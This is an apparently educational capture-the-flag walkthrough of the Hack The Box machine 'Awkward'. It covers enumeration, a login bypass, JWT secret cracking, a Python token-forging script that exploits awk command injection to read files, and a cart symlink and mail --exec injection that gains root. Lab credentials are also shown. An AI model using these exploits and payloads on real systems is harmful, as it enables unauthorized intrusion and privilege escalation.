# Awkward

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.228.81 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 02:45 EDT
Warning: 10.129.228.81 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.228.81
Host is up (0.025s latency).
Not shown: 64415 closed tcp ports (conn-refused), 1118 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We have to add `hat-valley.htb` to our `/etc/hosts` file to access this.&#x20;

### Hat Valley

This was a page dedicated to hats:

<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

On the page, there is mention of another site for the Store:

<figure><img src="../../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

There are also some users on the page, and we can note their names:

```
Christopher Jones
Jackson Lightheart
Christine Wool
Bean Hill
```

We can do a quick `wfuzz` scan to find subdomains, and sure enough, we find the `store` they are talking about.

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host:FUZZ.hat-valley.htb' --hw=13 -u http://hat-valley.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://hat-valley.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000081:   401        7 L      12 W       188 Ch      "store"
```

To access this, we do need credentials:

<figure><img src="../../../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>

When taking a look at the requests sent to the server while browsing, we see a `token` variable in use:

```http
GET / HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=guest
Upgrade-Insecure-Requests: 1
If-None-Match: W/"b41-tn8t3x3qcvcm126OQ/i0AXwBj8M"
```

Interesting. While looking at hte page source, we can see loads of files are actually left available for us to read.&#x20;

<figure><img src="../../../.gitbook/assets/image (31) (6).png" alt=""><figcaption></figcaption></figure>

While using Inspector tools, we can see this Webpack part here:

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

Within it, we can find a `router.js` file which should give us all of the routes accessible:

```javascript
import { createWebHistory, createRouter } from "vue-router";
import { VueCookieNext } from 'vue-cookie-next'
import Base from '../Base.vue'
import HR from '../HR.vue'
import Dashboard from '../Dashboard.vue'
import Leave from '../Leave.vue'

const routes = [
  {
    path: "/",
    name: "base",
    component: Base,
  },
  {
    path: "/hr",
    name: "hr",
    component: HR,
  },
  {
    path: "/dashboard",
    name: "dashboard",
    component: Dashboard,
    meta: {
      requiresAuth: true
    }
  },
  {
    path: "/leave",
    name: "leave",
    component: Leave,
    meta: {
      requiresAuth: true
    }
  }
];

const router = createRouter({
  history: createWebHistory(),
  routes,
});

router.beforeEach((to, from, next) => {
  if((to.name == 'leave' || to.name == 'dashboard') && VueCookieNext.getCookie('token') == 'guest') { //if user not logged in, redirect to login
    next({ name: 'hr' })
  }
  else if(to.name == 'hr' && VueCookieNext.getCookie('token') != 'guest') { //if user logged in, skip past login to dashboard
    next({ name: 'dashboard' })
  }
  else {
    next()
  }
})

export default router;
```

Using this, we can easily bypass the token for the `/hr` page.

### Login Bypass

Initially, this presents us with a login page:

<figure><img src="../../../.gitbook/assets/image (659).png" alt=""><figcaption></figcaption></figure>

This can easily be bypassed by changing the `token` parameter to literally anything else but `guest`. However, this does not work since we have the `guest` cookie stored within our browser. We can change this to something else:

<figure><img src="../../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Then, upon refreshing, we can view the dashboard:

<figure><img src="../../../.gitbook/assets/image (25) (2).png" alt=""><figcaption></figcaption></figure>

On this platform, there was only a Leave Requests form present:

<figure><img src="../../../.gitbook/assets/image (21) (8).png" alt=""><figcaption></figcaption></figure>

I filled in some random information into the fields, and found that there was an API on this:

<figure><img src="../../../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

Looking at the Webpack code, we can find more endpoints like `/api/login`, `/api/staff-details`, and so on.

### API --> Leak Creds

Within the `src` files we found earlier, we can see the `leave.js` file to see how the leave request functions:

```javascript
import axios from 'axios'
axios.defaults.withCredentials = true
const baseURL = "/api/"

const get_all = () => {
    return axios.get(baseURL + 'all-leave')
        .then(response => response.data)
}

const submit_leave = (reason, start, end) => {
    return axios.post(baseURL + 'submit-leave', {reason, start, end})
        .then(response => response.data)
}

export default {
    get_all,
    submit_leave
}
```

When we try to submit leave, we get some weird JWT error:

<figure><img src="../../../.gitbook/assets/image (658).png" alt=""><figcaption></figcaption></figure>

JWT is a cookie, so what happens if we remove Cookies altogether? We would get a different error:

<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

I wasn't sure how to exploit this yet. Looking at the `src/services` scripts within Webpack, we can find more endpoints like `/api/staff-details`. When visited, it returns a bunch of hashes without a token:

```
$ curl http://hat-valley.htb/api/staff-details -H "Cookie: token=test"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>JsonWebTokenError: jwt malformed 
<TRUNCATED>

$ curl http://hat-valley.htb/api/staff-details  | jq .
[
  {
    "user_id": 1,
    "username": "christine.wool",
    "password": "6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",
    "fullname": "Christine Wool",
    "role": "Founder, CEO",
    "phone": "0415202922"
  },
  {
    "user_id": 2,
    "username": "christopher.jones",
    "password": "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",
    "fullname": "Christopher Jones",
    "role": "Salesperson",
    "phone": "0456980001"
  },
  {
    "user_id": 3,
    "username": "jackson.lightheart",
    "password": "b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",
    "fullname": "Jackson Lightheart",
    "role": "Salesperson",
    "phone": "0419444111"
  },
  {
    "user_id": 4,
    "username": "bean.hill",
    "password": "37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",
    "fullname": "Bean Hill",
    "role": "System Administrator",
    "phone": "0432339177"
  }
]
```

Now we have some hashes, and since we are Christopher Jones on the HR site, we can crack his hash first to get `chris123`. Then, we can login to via `/api/login`.&#x20;

{% code overflow="wrap" %}
```
$ curl -X POST http://hat-valley.htb/api/login -H 'Content-Type: application/json' -d '{"username":"christopher.jones","password":"chris123"}'
{"name":"Christopher","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjgzNzAzMzUyfQ.2HZs4fgwS-aC-RAlKB2wISj0Dxe606QOiMNUDGEFp24"}
```
{% endcode %}

Then, we can replace our placeholder cookie with this value.&#x20;

### SSRF --> LFI Creds

Using this token, we can actually send leave requests.

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

Using it, we can enumerate the `/store-status` endpoint:

```javascript
import axios from 'axios'
axios.defaults.withCredentials = true
const baseURL = "/api/"

const store_status = (URL) => {
    const params = {
        url: {toJSON: () => URL}
    }
    return axios.get(baseURL + 'store-status', {params})
        .then(response => response.data)
}

export default {
    store_status
}
```

Notice that the parameter is passed directly to a JSON object here, meaning we need to have `"` when we send our URL. By sending our own URL, it returns the page contents:

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

Using this SSRF, we can actually scan the ports present on the machine using `wfuzz`:

```
$ wfuzz -c -z range,1-65535 --hw=0 http://hat-valley.htb/api/store-status?url=%22http://127.0.0.1:FUZZ%22 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://hat-valley.htb/api/store-status?url=%22http://127.0.0.1:FUZZ%22
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000080:   200        8 L      13 W       132 Ch      "80"                        
000003002:   200        685 L    5834 W     77002 Ch    "3002"                      
000008080:   200        54 L     163 W      2881 Ch     "8080"
```

By visiting the link, we can actually load the pages ourselves. Port 3002 in this case hosts the documentation of the API.

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

The code for `all-leave` is rather interesting:

```javascript
app.get('/api/all-leave', (req, res) => {
  const user_token = req.cookies.token
  var authFailed = false
  var user = null
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if (!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }
  if (authFailed) {
    return res.status(401).json({Error: "Invalid Token"})

  }
  if (!user) {
    return res.status(500).send("Invalid user")
  }
  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]
  const badInUser = bad.some(char => user.includes(char));
  if(badInUser) {
    return res.status(500).send("Bad character detected.")
  }
  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
    if(stdout) {
      return res.status(200).send(new Buffer(stdout, 'binary'));
    }
    if (error) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
    if (stderr) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
  })
})
```

This takes the user input and passes it to an `exec` function. The bad characters list is pretty good, but it does not block `../`, meaning we can get LFI for this. However, the `user` is not a parameter, but rather it is derived from the token itself.&#x20;

In order to to continue with this, we would have to spoof tokens, and this requires us to first find the secret of our token. We can use `gojwtcrack` for this:

{% code overflow="wrap" %}
```
$ gojwtcrack-linux-amd64 -t token -d /usr/share/wordlists/rockyou.txt
123beany123     eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjgzNzAzMzUyfQ.2HZs4fgwS-aC-RAlKB2wISj0Dxe606QOiMNUDGEFp24v
```
{% endcode %}

Now that we have the password, let's create a quick script to encrypt the tokens required.

```python
import requests
import jwt

def gen_token(file):
	encoded_data = jwt.encode(payload = {"username":f"/' {file} '"}, key ='123beany123', algorithm='HS256')
	return encoded_data
def read(file):
	token = gen_token(file)
	try:
		url = 'http://hat-valley.htb/api/all-leave'
		cookie = {"token":f"{token}"}
		r = requests.get(url, cookies=cookie)
		if (r.status_code == 200):
			print(r.text)
	except Exception as e:
		print(f"[-] LFI Error: {e}.")

def main():
	while True:
		file = input("File: ")
		read(file)

if __name__ == "__main__":
	main()
```

This works:

<figure><img src="../../../.gitbook/assets/image (27) (2).png" alt=""><figcaption></figcaption></figure>

Now that we have easy LFI, we can enumerate some possible files:

```
File: /etc/nginx/sites-enabled/store.conf
server {
    listen       80;
    server_name  store.hat-valley.htb;
    root /var/www/store;

    location / {
        index index.php index.html index.htm;
    }
    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    #
    location ~ /cart/.*\.php$ {
        return 403;
    }
    location ~ /product-details/.*\.php$ {
        return 403;
    }
    location ~ \.php$ {
        auth_basic "Restricted";
        auth_basic_user_file /etc/nginx/conf.d/.htpasswd;
        fastcgi_pass   unix:/var/run/php/php8.1-fpm.sock;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  $realpath_root$fastcgi_script_name;
        include        fastcgi_params;
    }
    # deny access to .htaccess files, if Apache's document root
    # concurs with nginx's one
    #
    #location ~ /\.ht {
    #    deny  all;
    #}
}

File: /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```

I know that when I tackle `nginx` servers, the configuration files are sometimes stored as the domain names. I went around trying to find `hat-valley.htb.conf`, which actually worked.&#x20;

```
File: /etc/nginx/sites-available/hat-valley.htb.conf
server {
    listen 80;
    server_name hat-valley.htb;
    root /var/www/hat-valley.htb;

    location / {
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
```

This does not tell me much, other than the fact that the sites are forwarded to port 8080. Next, we can try to read the user files, and checking the `.bashrc` files since they are files that all can read. It was within the `bean` home directory did I find something interesting:

```
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
```

Here's the contents:

```bash
File: /home/bean/Documents/backup_home.sh
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

We can download this entire file using the LFI we have and `curl`.&#x20;

{% code overflow="wrap" %}
```bash
curl http://hat-valley.htb/api/all-leave -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyJ9.RGtm7jw23GjIU92tAoVDo7sNsxemHZZGB9-vvarH9uQ' -o backup.tar.gz
```
{% endcode %}

Afterwards, we can use `tar xf backup.tar.gz` to open it up and view the files. I filtered it to include `password` and `bean` the username.&#x20;

```
$ ls    
backup.tar.gz       Desktop    Downloads  Pictures  snap       time.txt
bean_backup.tar.gz  Documents  Music      Public    Templates  Videos

$ grep -iRl 'password' ./ 2> /dev/null
./.config/evolution/sources/system-proxy.source

$ grep -iRl 'bean' ./ 2> /dev/null           
./.config/xpad/content-DS1ZS1
./.config/gtk-3.0/bookmarks
./.config/ibus/bus/ee6a821b27764b4d9e547b4690827539-unix-wayland-0
./.config/ibus/bus/ee6a821b27764b4d9e547b4690827539-unix-0
./.bashrc
./snap/snapd-desktop-integration/current/.config/user-dirs.dirs
./snap/snapd-desktop-integration/14/.config/user-dirs.dirs
./Documents/backup_home.sh
```

Within the `xpad` file, we can find a password:

```
 cat ./.config/xpad/content-DS1ZS1                  
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity > 1
- Implement checkout system

boldHR SYSTEM/bold
bean.hill
014mrbeanrules!#P
```

We can use this to `ssh` in:

<figure><img src="../../../.gitbook/assets/image (677).png" alt=""><figcaption></figcaption></figure>

Grab the user flag. Also, with this password, we can access the store.&#x20;

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Pspy

Within the `/var/www` file, there is a private folder:

```
bean@awkward:/var/www$ ls
hat-valley.htb  html  private  store
```

I can't read it yet, but for now we'll take note of this. I ran a `pspy64` to enumerate the processes running on the machine:

```
2023/05/10 18:19:26 CMD: UID=0    PID=1018   | /bin/bash /root/scripts/notify.sh 
2023/05/10 18:19:26 CMD: UID=0    PID=1017   | inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv
2023/05/10 18:20:02 CMD: UID=0    PID=3830   | mail -s Leave Request: bean.hill christine 
```

This was interesting, because the file inside contains some stuff that we might need. It should also be noted that `mail` has an entry on GTFOBins for exploitation:

{% embed url="https://gtfobins.github.io/gtfobins/mail/" %}

### Cart Injection

When reading the source code for the `store`, I found some interesing commands run:

```php
//add to cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'add_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    if(checkValidItem("{$STORE_HOME}product-details/{$item_id}.txt")) {
        if(!file_exists("{$STORE_HOME}cart/{$user_id}")) {
            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
        }
        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
        echo "Item added successfully!";
    }
    else {
        echo "Invalid item";
    }
    exit;
}
```

When we add products to the cart, it would track our order based on our `user_id` parameter. So when I send this request here:

```http
POST /cart_actions.php HTTP/1.1
Host: store.hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 36
Origin: http://store.hat-valley.htb
Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
Connection: close
Referer: http://store.hat-valley.htb/shop.php



item=55&user=newuser&action=add_item
```

It would create a new file called `newuser` within the `cart` directory, and the contents of the file would be from `/product-details/1.txt`. Since we can create items in `/product-details`, we can essentially create files with any input we want.&#x20;

```
bean@awkward:/var/www/store/product-details$ cat ../cart/newuser 
***Hat Valley Cart***
new product
```

The above is possible by creating a `55.txt` file and selecting `item` 55. Since we can overwrite any files we want with anything and we have a vulnerable cronjob running `mail`, we can try to write `--exec='!/dev/shm/suid.sh'` as the name of the user to get `root` to run our script.&#x20;

To do this, we first need to create a symbolic link as `user123` that links to `/var/www/private/leaave_requests.csv`. Anything that is written to `user123` would let us write to `leave_requests.csv`, which would be passed into the `mail` command.

Afterwards, we can create a file that contains the `--exec` command to run `suid.sh` on the machine.&#x20;

```bash
ln -sf /var/www/private/leave_requests.csv /var/www/store/cart/user123
echo '***Hat Valley Product***' > /var/www/store/product-details/70.txt
echo 'test --exec="!/dev/shm/suid.sh"' >> /var/www/store/product-details/70.txt
```

Afterwards, send this request in Burp:

```http
POST /cart_actions.php HTTP/1.1
Host: store.hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 36
Origin: http://store.hat-valley.htb
Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
Connection: close
Referer: http://store.hat-valley.htb/shop.php

item=70&user=user123&action=add_item
```

This would insert our command into the `leave_request.csv` file and execute it:

<figure><img src="../../../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>
